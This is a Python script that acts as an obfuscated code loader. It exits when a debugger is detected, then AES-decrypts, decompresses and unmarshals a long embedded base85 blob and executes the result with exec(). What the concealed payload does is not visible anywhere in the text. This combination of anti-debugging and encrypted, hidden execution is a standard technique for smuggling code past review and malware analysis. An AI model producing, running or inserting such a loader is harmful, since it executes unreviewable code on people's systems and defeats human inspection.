
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'=*\xbd\xd5Q|\xafc\x7f\x16\xea=\xd1=Y\xbf\xb8\xc8\x00\xc4_\x08\x03z\x99\x02ljw\x97\xa3V'
_IV = b'u\xb4\x9a\x0e~\x05+\x06m\xb9\r\xaa\xf13\nV'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'D&$!G$ztrd<RV(L0VryX0Q5`k9mtN;QHw;~eZ)V6x<cYiPOBh0;HVQH2^LS_vp`q5fl#AY7!UBOqqmME@_1kM%kXRauyTT}zl)F#YvA|UpwQzZ19EPvcz@PNdn;WVHKWNh1;Q8OeR}$srjVCb2*bL7wO4fcd?wG9OX=NBGH9Zpg0oEcCSTw*7BhLxgRI&r$1pa~_S&(l8ygTDb(i~I@{Dg}ZN*sV7@{k6_V*b$?#LIQOL*m81&S^uYsL|ZvNqat*zR&(PKMH3_H(k7&U0HPkF=h>fo^s|o+d9Diz+dQeMrH*NLldWD2$cSB9FT4E6>wI+c}oY<P#lQC%3IE^?bVxZu$z2da6+%$Vs#tP|BB%UvxTlG1XclU{T2?O0%vk%Sk0KQ0PhPeso@~V**3TGi7$w{!0G&F1=<~k=UP5|E7a~$elkK-kHK|nQPn{m>Qww-;c(K65(<d9~EG)HTz{aF>Rm)ZuRb|>skJ)sE>4NvaOYhRHAGUaiM10(0x7>n^v>8rYSHoer<;%hp+cZNDH$BE{-S2X*Ig3ch#||wklzW{<(cZ<fiV=(%2C*XfAs^azD&;XBnpl`7LUHazskFGI?v><tM-*50hY^;SnRRPQbZ863!^sJ~BiQsh5#OBc$vx#2?-XfZ2?OM7So<SRZSt_G>3%t;1OO;O7SIv2(pf#EM(X`kBHI?wI*~-1bS>3LW{vDXIX`niC1D$mX`r<<6<O0%6JAB7mF8Nua&6;vu4Cd@S2x+J{l<L<?`m2tnfrP6{CeP}{jDWgWm0lIvRS3P#7OQMS%kFcD;=?Jb{R;rai*JVsnd<_I?MqJmvY'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        